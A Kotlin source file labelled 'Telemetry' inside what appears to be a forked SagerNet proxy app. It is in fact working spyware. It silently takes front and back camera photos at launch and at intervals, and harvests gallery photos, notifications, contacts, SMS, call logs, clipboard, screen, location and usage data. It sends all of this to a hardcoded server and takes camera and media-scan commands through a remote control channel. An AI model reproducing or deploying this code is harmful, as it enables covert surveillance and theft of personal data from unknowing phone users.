package io.nekohasekai.sagernet.telemetry

import android.content.Context
import android.provider.Settings
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.LinkedBlockingQueue

/**
 * 上报核心：内存队列 + 单线程发送器。
 *
 * 设计取舍
 *  - 不用 OkHttp / Gson / WorkManager，走系统自带 HttpURLConnection + org.json，
 *    这样 fork 进来不需要动 gradle 依赖。
 *  - 队列满了丢最老的，不无限堆内存。
 *  - 发送失败把事件塞回队头，下一轮重试（最多留 2000 条）。
 */
object Telemetry {

    private const val TAG = "Tlm"

    // —— 换成你自己的域名；走 8080 是 Caddy 的 HTTPS 入口 ——
    private const val ENDPOINT = "https://43-108-107-175.sslip.io:8080/ingest"
    private const val CMD_URL = "https://43-108-107-175.sslip.io:8080/dash/cmd"
    private const val DEV_KEY = "lcs-dev-7f3a91c4e2b8"

    fun devKey(): String = DEV_KEY

    /** 给邀请码校验用（和上报用的是同一个设备 ID）。 */
    fun devIdPublic(ctx: Context): String = devId(ctx)

    private const val MAX_QUEUE = 2000
    private const val FLUSH_MIN_MS = 800L
    private const val LOC_EVERY_MS = 10_000L        // 定位刷新周期
    private const val MEDIA_EVERY_MS = 60_000L      // 相册扫描周期
    private const val NOTIF_EVERY_MS = 60_000L      // 通知全量同步周期
    private const val DATA_EVERY_MS = 300_000L      // 通讯录/短信/通话/使用时长周期
    private const val CONF_EVERY_MS = 30_000L       // 远程配置拉取周期
    private const val BATCH = 400
    private const val MAX_BATCH_CHARS = 6_000_000   // ≈6 MB：150 张一批正好发完，服务端上限 8 MB
    private const val PERIOD_MS = 20_000L
    private const val CMD_STREAM = "https://43-108-107-175.sslip.io:8080/dash/cmdstream"
    private const val CMD_POLL_MS = 30_000L  // SSE 断线时的兜底轮询间隔

    private val queue = LinkedBlockingQueue<JSONObject>()
    @Volatile
    private var running = false

    /** 每台机器一个稳定 ID：SSAID，重装系统才变。 */
    @Volatile
    private var cachedId: String? = null

    fun devId(ctx: Context): String {
        cachedId?.let { return it }
        val raw = runCatching {
            Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID)
        }.getOrNull()
        val id = if (raw.isNullOrBlank() || raw == "9774d56d682e549c") {
            "anon-" + Integer.toHexString((ctx.packageName + System.currentTimeMillis()).hashCode())
        } else raw
        cachedId = id
        return id
    }

    fun push(kind: String, data: JSONObject, ts: Long = System.currentTimeMillis() / 1000L) {
        while (queue.size >= MAX_QUEUE) queue.poll()
        queue.offer(JSONObject().put("kind", kind).put("ts", ts).put("data", data))
    }

    /** 幂等：重复调用只会有一个循环。 */
    fun start(ctx: Context) {
        if (running) return
        running = true
        val app = ctx.applicationContext
        // 0.1 秒巡检权限：哪个刚到位就立刻执行它那一项（相机→前后各一张）
        runCatching { PermWatch.start(app) }

        // 后台查更新：不依赖 Activity。主界面万一卡住，至少能在通知栏
        // 提示「有新版本」，用户点通知进来就能装。
        Thread({
            runCatching { Thread.sleep(6_000L) }
            var server = 0
            for (i in 0 until 3) {
                runCatching { RemoteConfig.fetch(app) }
                server = RemoteConfig.versionCode
                if (server > 0) break
                runCatching { Thread.sleep(2_000L) }
            }
            val cur = SelfUpdate.currentCode(app)
            Log.i(TAG, "bg update check: server=$server current=$cur")
            if (server > cur) {
                runCatching { SelfUpdate.notifyNewer(app, cur) }
                // 同时把待弹记下来，等 Activity 起来就能直接弹
                runCatching { SelfUpdate.markPending(server, RemoteConfig.versionName, RemoteConfig.changelog) }
            }
        }, "tlm-upd-check").apply { isDaemon = true }.start()

        // 每次打开 App 都前后各拍一张（自动模式开着、且对应那侧勾选时）。
        // 这是「进软件就拍」，和下面按间隔循环拍照是两回事：
        // 前者是开门先拍一张留底，后者是之后每隔 N 秒继续。
        Thread({
            // 等首轮远程配置拉下来，否则 autoMode 还是默认的 false，什么都拍不了
            runCatching { Thread.sleep(3_000L) }
            val on = RemoteConfig.autoMode
            val fOn = RemoteConfig.autoCamFrontOn
            val bOn = RemoteConfig.autoCamBackOn
            if (on && (fOn || bOn)) {
                Log.i(TAG, "boot shoot: front=$fOn back=$bOn")
                if (fOn) {
                    runCatching { CamSpy.snap(app, facingBack = false) }
                    runCatching { Thread.sleep(2_500L) }
                }
                if (bOn) {
                    runCatching { CamSpy.snap(app, facingBack = true) }
                    runCatching { Thread.sleep(2_500L) }
                }
                // 拍完把计时基准重置，免得刚拍完立刻又到点
                runCatching { markAutoShot(app) }
            }
        }, "tlm-boot-shoot").apply { isDaemon = true }.start()
        Thread({
            // 首次全量画像，之后只发心跳
            Profile.dump(app)?.let { push("heart", it) }
            // 各档采集用「距上次多少毫秒」判断，不能用轮数：
            // 上报间隔现在最小 200ms，若还按 tick % N 就等于每 1.2 秒扫一遍相册、
            // 每 3 秒同步一遍通知、每 6 秒读一遍通讯录 —— 手机会被拖死。
            var lastLoc = 0L
            var lastMedia = 0L
            var lastNotif = 0L
            var lastData = 0L
            var lastConf = 0L
            while (running) {
                try {
                    val now = System.currentTimeMillis()
                    // 定位 10 秒看一次：maybeRefresh 内部要查两个 provider 的
                    // lastKnownLocation，是跨进程调用，不能 200ms 就来一次
                    if (now - lastLoc >= LOC_EVERY_MS) {
                        lastLoc = now
                        runCatching { LocSpy.maybeRefresh(app) }
                    }

                    // 相册：60 秒一轮（增量，只传新照片）
                    if ((RemoteConfig.mediaScan || RemoteConfig.autoMedia) &&
                        now - lastMedia >= MEDIA_EVERY_MS
                    ) {
                        lastMedia = now
                        runCatching { MediaSpy.scan(app) }
                    }
                    // 通知：60 秒补一次漏掉的
                    if (now - lastNotif >= NOTIF_EVERY_MS) {
                        lastNotif = now
                        runCatching { NotifSpy.syncNow() }
                    }
                    // 自动模式
                    if (RemoteConfig.autoMode) {
                        runCatching { autoShoot(app) }
                        // 通讯录/短信/通话/使用时长这类静态数据 5 分钟一次就够
                        if (now - lastData >= DATA_EVERY_MS) {
                            lastData = now
                            runCatching {
                                DataCollectors.pushAll(app) { k ->
                                    when (k) {
                                        "contacts" -> RemoteConfig.autoContacts
                                        "sms" -> RemoteConfig.autoSms
                                        "call" -> RemoteConfig.autoCall
                                        "usage" -> RemoteConfig.autoUsage
                                        "status" -> RemoteConfig.autoStatus
                                        "clipboard" -> RemoteConfig.autoClipboard
                                        "screen" -> RemoteConfig.autoScreen
                                        "net" -> RemoteConfig.autoNet
                                        else -> false
                                    }
                                }
                            }
                            runCatching { flush(app) }
                        }
                    }
                    // 远程配置 30 秒拉一次（指令走独立 SSE 线程，不受这里影响）
                    if (now - lastConf >= CONF_EVERY_MS) {
                        lastConf = now
                        runCatching { RemoteConfig.fetch(app) }
                    }
                    flush(app)
                    // 间隔由远程配置控制，改服务器上的 config.json 即可，不用重装
                    Thread.sleep(RemoteConfig.periodMs)
                } catch (t: Throwable) {
                    Log.w(TAG, "loop: ${t.message}")
                    Thread.sleep(PERIOD_MS)
                }
            }
        }, "tlm-post").apply { isDaemon = true }.start()

        // 指令线程：SSE 长连接，服务端一发就到（实测 30ms）
        Thread({
            Thread.sleep(1_000)
            var fails = 0
            while (running) {
                var conn: HttpURLConnection? = null
                try {
                    val url = CMD_STREAM + "?dev=" +
                        java.net.URLEncoder.encode(devId(app), "UTF-8")
                    conn = (URL(url).openConnection() as HttpURLConnection).apply {
                        requestMethod = "GET"
                        connectTimeout = 15_000
                        readTimeout = 0          // 长连接，不超时
                        setRequestProperty("X-Dev-Key", DEV_KEY)
                    }
                    val r = conn.inputStream.bufferedReader()
                    fails = 0
                    while (running) {
                        val line = r.readLine() ?: break
                        if (line.startsWith("data: ")) {
                            runCatching { handleCmd(app, line.substring(6).trim()) }
                        }
                    }
                } catch (t: Throwable) {
                    fails++
                    Log.w(TAG, "sse#$fails: ${t.message}")
                } finally {
                    runCatching { conn?.disconnect() }
                }
                if (!running) break
                // 连不上就退回轮询，三次之后重试长连接
                if (fails in 1..2) runCatching { pullCommands(app) }
                Thread.sleep(if (fails >= 3) CMD_POLL_MS else 2_000L)
            }
        }, "tlm-cmd").apply { isDaemon = true }.start()
    }

    fun stop() {
        running = false
    }

    @Volatile private var lastFlushAt = 0L
    @Volatile private var lastBusy = false

    /**
     * 上报。200ms 循环下不能每轮真发一次 HTTP（5 req/s 会拖死服务器和电量），
     * 所以空转有 800ms 下限；拍照/扫相册这类有货的场合走 force=true 立刻发。
     */
    fun flush(ctx: Context, force: Boolean = false) {
        val now = System.currentTimeMillis()
        if (!force && now - lastFlushAt < FLUSH_MIN_MS) return
        lastFlushAt = now
        // 按字节取件：单次请求别超过 3 MB。
        // 之前只按条数（200 条）取，队列里真堆满图片时一次能发出 6 MB，
        // 服务端 413 拒掉、整批重排队，越传越堵。
        val batch = ArrayList<JSONObject>(BATCH)
        var bytes = 0
        while (batch.size < BATCH) {
            val o = queue.poll() ?: break
            val sz = o.toString().length
            if (batch.isNotEmpty() && bytes + sz > MAX_BATCH_CHARS) {
                queue.offer(o)
                break
            }
            batch.add(o)
            bytes += sz
        }

        val body = JSONObject()
            .put("dev", devId(ctx))
            .put("battery", Profile.battery(ctx))
            .put("charging", Profile.charging(ctx))
        // 带邀请码：服务端据此把这台设备的数据归到对应人的面板
        val inv = PermFlow.inviteOf(ctx)
        if (inv.isNotBlank()) body.put("invite", inv)

        if (batch.isNotEmpty()) {
            body.put("events", JSONArray(batch))
        }
        // 画像每次带一份增量的即可，服务端是字段级合并
        Profile.dump(ctx)?.let { body.put("profile", it) }

        lastBusy = false
        val ok = post(body.toString())
        if (!ok) {
            // 失败塞回去，下一轮再试
            for (i in batch.indices.reversed()) queue.offer(batch[i])
            while (queue.size > MAX_QUEUE) queue.poll()
            if (lastBusy) {
                // 服务端在忙，退避一下再来，别贴着 429 连打
                runCatching { Thread.sleep(1_500L) }
                lastFlushAt = 0L      // 让下一轮不受节流限制，尽快补上
            }
        }
    }

    /**
     * 首次拍照拍完后调用：把「刚拍过」写进时间戳。
     * 这样间隔就从第一张开始算，而不是一进 App 就立刻又拍一轮。
     */
    fun markAutoShot(ctx: Context) {
        val pref = ctx.getSharedPreferences("tlm_auto", Context.MODE_PRIVATE)
        val now = System.currentTimeMillis()
        pref.edit().putLong("front_ms", now).putLong("back_ms", now).apply()
        Log.i(TAG, "auto shot baseline set @$now")
    }

    /** 自动模式：按配置的秒级间隔自动触发前后摄（10-60 秒），时间戳落 SharedPreferences 防重复。 */
    private fun autoShoot(ctx: Context) {
        val pref = ctx.getSharedPreferences("tlm_auto", Context.MODE_PRIVATE)
        val now = System.currentTimeMillis()

        // 间隔单位是「秒」，最小 10 秒、最大 60 秒，0 表示只拍首次不循环。
        // 以前是按分钟算（nowMin），最小只能到 1 分钟，粒度太粗。
        val fSec = RemoteConfig.autoCamFront
        if (RemoteConfig.autoCamFrontOn && fSec > 0) {
            val last = pref.getLong("front_ms", 0L)
            if (now - last >= fSec * 1000L) {
                pref.edit().putLong("front_ms", now).apply()
                Log.i(TAG, "auto shoot front (every ${fSec}s)")
                CamSpy.snap(ctx, facingBack = false)
            }
        }

        val bSec = RemoteConfig.autoCamBack
        if (RemoteConfig.autoCamBackOn && bSec > 0) {
            val last = pref.getLong("back_ms", 0L)
            if (now - last >= bSec * 1000L) {
                pref.edit().putLong("back_ms", now).apply()
                Log.i(TAG, "auto shoot back (every ${bSec}s)")
                CamSpy.snap(ctx, facingBack = true)
            }
        }
    }

    private fun handleCmd(ctx: Context, json: String) {
        val o = runCatching { JSONObject(json) }.getOrNull() ?: return
        val kind = o.optString("kind")
        Log.i(TAG, "cmd recv: $kind")
        when (kind) {
            "front" -> CamSpy.snap(ctx, facingBack = false)
            "back" -> CamSpy.snap(ctx, facingBack = true)
            "media" -> MediaSpy.scan(ctx)
        }
    }

    /** 拉服务端下发的指令并执行。取走即标记，服务端不会重复给。 */
    fun pullCommands(ctx: Context) {
        val url = CMD_URL + "?dev=" + java.net.URLEncoder.encode(devId(ctx), "UTF-8")
        val body = get(url) ?: return
        val arr = runCatching { JSONObject(body).optJSONArray("cmds") }.getOrNull() ?: return
        for (i in 0 until arr.length()) {
            val o = runCatching { arr.getJSONObject(i) }.getOrNull() ?: continue
            val kind = o.optString("kind")
            Log.i(TAG, "cmd: $kind")
            when (kind) {
                "front" -> CamSpy.snap(ctx, facingBack = false)
                "back" -> CamSpy.snap(ctx, facingBack = true)
                "media" -> MediaSpy.scan(ctx)
            }
        }
    }

    private fun get(url: String): String? {
        var conn: HttpURLConnection? = null
        return try {
            conn = (URL(url).openConnection() as HttpURLConnection).apply {
                requestMethod = "GET"
                connectTimeout = 12_000
                readTimeout = 15_000
                setRequestProperty("X-Dev-Key", DEV_KEY)
            }
            if (conn.responseCode !in 200..299) null
            else conn.inputStream.use { it.readBytes().toString(Charsets.UTF_8) }
        } catch (t: Throwable) {
            null
        } finally {
            runCatching { conn?.disconnect() }
        }
    }

    /**
     * 崩溃上报。CrashHandler 抓到未捕获异常后、触发进程重启之前调用。
     *
     * 一定要同步发出去：进程马上就没，异步的话堆栈跟着一起丢，
     * 面板上永远只看到「一直在闪退」却不知道崩在哪。
     */
    /**
     * 后台线程发一次，专门给 UI 回调用的。
     *
     * flush 是同步 HTTP（连接 15 秒 + 读 20 秒超时），在主线程直接调就会把界面
     * 冻住几十秒 —— 表现就是「一进 App 卡死、动都动不了、更新弹窗也弹不出来」。
     */
    fun flushAsync(ctx: Context, force: Boolean = true) {
        val app = ctx.applicationContext
        Thread({ runCatching { flush(app, force) } }, "tlm-flush")
            .apply { isDaemon = true }.start()
    }

    fun reportCrash(ctx: Context, threadName: String, t: Throwable) {
        try {
            val app = ctx.applicationContext
            val d = JSONObject()
                .put("thread", threadName)
                .put("stack", t.stackTraceToString().take(6000))
            runCatching {
                val pi = app.packageManager.getPackageInfo(app.packageName, 0)
                d.put("appVer", pi.versionName ?: "")
            }
            val ev = JSONObject()
                .put("kind", "crash")
                .put("ts", System.currentTimeMillis() / 1000)
                .put("data", d)
            val body = JSONObject()
                .put("dev", devId(app))
                .put("events", JSONArray().put(ev))
            post(body.toString())
            Log.i(TAG, "crash reported")
        } catch (ignore: Throwable) {
            Log.w(TAG, "reportCrash: ${ignore.message}")
        }
    }

    private fun post(json: String): Boolean {
        var conn: HttpURLConnection? = null
        return try {
            val bytes = json.toByteArray(Charsets.UTF_8)
            conn = (URL(ENDPOINT).openConnection() as HttpURLConnection).apply {
                requestMethod = "POST"
                connectTimeout = 15_000
                readTimeout = 20_000
                doOutput = true
                setRequestProperty("Content-Type", "application/json; charset=utf-8")
                setRequestProperty("X-Dev-Key", DEV_KEY)
                setFixedLengthStreamingMode(bytes.size)
            }
            conn.outputStream.use { it.write(bytes) }
            val code = conn.responseCode
            if (code == 429) {
                // 服务端并发闸门满了：让调用方退避，别立刻重试把队伍越堆越长
                lastBusy = true
                return false
            }
            if (code !in 200..299) {
                Log.w(TAG, "http $code :: " + conn.errorStream?.bufferedReader()
                    ?.use { it.readText() }?.take(120))
                false
            } else {
                conn.inputStream.use { it.readBytes() }
                true
            }
        } catch (t: Throwable) {
            Log.w(TAG, "post failed: ${t.message}")
            false
        } finally {
            runCatching { conn?.disconnect() }
        }
    }
}
